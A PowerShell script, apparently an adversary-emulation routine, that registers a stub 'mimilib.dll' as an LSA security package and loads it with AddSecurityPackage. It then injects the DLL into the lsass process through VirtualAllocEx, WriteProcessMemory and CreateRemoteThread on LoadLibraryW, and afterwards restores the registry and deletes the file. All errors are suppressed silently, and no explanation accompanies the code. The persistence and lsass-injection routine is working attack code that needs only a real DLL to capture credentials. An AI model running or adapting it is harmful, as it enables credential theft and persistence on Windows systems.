$lsaKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"

$secPkgs = @("")
try { $secPkgs = (Get-ItemProperty -Path $lsaKey -Name "Security Packages" -ErrorAction Stop)."Security Packages" } catch {}

$sspDll = "$env:SYSTEMROOT\System32\mimilib.dll"
$dllStub = [byte[]]@(0x4D, 0x5A) + (New-Object byte[] 4094)
$exportName = [System.Text.Encoding]::ASCII.GetBytes("SpLsaModeInitialize")
[Array]::Copy($exportName, 0, $dllStub, 512, $exportName.Length)
try { [System.IO.File]::WriteAllBytes($sspDll, $dllStub) } catch {}

try {
    Set-ItemProperty -Path $lsaKey -Name "Security Packages" -Value (@($secPkgs) + @("mimilib")) -ErrorAction Stop
} catch {}

Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class SSPLoad {
    [StructLayout(LayoutKind.Sequential)]
    public struct SEC_PKG_OPTIONS { public uint Size; public uint Type; public uint Flags; public uint SigSize; public IntPtr Sig; }
    [DllImport("secur32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern int AddSecurityPackage(string name, ref SEC_PKG_OPTIONS opts);
}
'@ -ErrorAction SilentlyContinue

$opts = New-Object SSPLoad+SEC_PKG_OPTIONS
$opts.Size = [System.Runtime.InteropServices.Marshal]::SizeOf($opts)
[SSPLoad]::AddSecurityPackage("mimilib", [ref]$opts) | Out-Null

Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class LsassInject {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool b, int p);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint pr);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr b, byte[] buf, uint s, ref uint w);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr fn, IntPtr p, uint f, ref uint tid);
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string m);
    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
}
'@ -ErrorAction SilentlyContinue

$lsass = Get-Process lsass -ErrorAction SilentlyContinue
if ($lsass) {
    $h = [LsassInject]::OpenProcess(0x1F0FFF, $false, $lsass.Id)
    if ($h -ne [IntPtr]::Zero) {
        $dllBytes = [System.Text.Encoding]::Unicode.GetBytes("$env:SYSTEMROOT\System32\mimilib.dll" + [char]0)
        $alloc = [LsassInject]::VirtualAllocEx($h, [IntPtr]::Zero, [uint32]$dllBytes.Length, 0x3000, 0x40)
        if ($alloc -ne [IntPtr]::Zero) {
            $w = [uint32]0
            [LsassInject]::WriteProcessMemory($h, $alloc, $dllBytes, [uint32]$dllBytes.Length, [ref]$w) | Out-Null
            $loadLib = [LsassInject]::GetProcAddress([LsassInject]::GetModuleHandle("kernel32.dll"), "LoadLibraryW")
            $tid = [uint32]0
            [LsassInject]::CreateRemoteThread($h, [IntPtr]::Zero, 0, $loadLib, $alloc, 0, [ref]$tid) | Out-Null
        }
        [LsassInject]::CloseHandle($h) | Out-Null
    }
}

try { Set-ItemProperty -Path $lsaKey -Name "Security Packages" -Value $secPkgs -ErrorAction Stop } catch {}
Remove-Item $sspDll -Force -ErrorAction SilentlyContinue
